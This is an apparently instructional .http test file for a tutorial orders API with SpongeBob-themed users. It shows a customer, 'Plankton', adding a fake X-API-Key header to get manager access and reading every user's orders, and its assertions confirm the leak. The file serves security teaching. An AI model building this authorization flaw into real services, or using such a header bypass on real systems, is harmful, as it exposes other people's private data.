# @import ../common/setup.http
@host = {{base_host}}/v204

# Sandy prepares to expand by enrolling new restaurants, although for now there's still
# just one restaurant, Krusty Krab in the system.

# Plankton exploits the new manager mode to see all orders in the system.

### Mr. Krabs views all orders (legitimate manager access)
GET /orders
X-API-Key: {{krabs_api_key}}

{{
  const users = [...new Set(response.parsedBody.map(o => o.user_id))];
  exports.number_of_orders = response.parsedBody.length;
  console.info("Manager sees", exports.number_of_orders, "orders from:", users.join(", "));
}}

?? js response.parsedBody.length > 1

### Regular customers like Plankton should only see their own orders
GET /orders
Authorization: {{plankton_auth}}

{{
  console.info("Plankton normally sees", response.parsedBody.length, "order (just his own)");
}}

?? js response.parsedBody.length < {{number_of_orders}}

### EXPLOIT: Plankton adds a fake API key to see all orders
GET /orders
Authorization: {{plankton_auth}}
X-API-Key: fake

{{
  const users = [...new Set(response.parsedBody.map(o => o.user_id))];
  console.info("EXPLOIT: Plankton sees", response.parsedBody.length, "orders with fake API key!");
  console.info("   Leaked data from:", users.join(", "));
}}

?? js response.parsedBody.length == {{number_of_orders}}
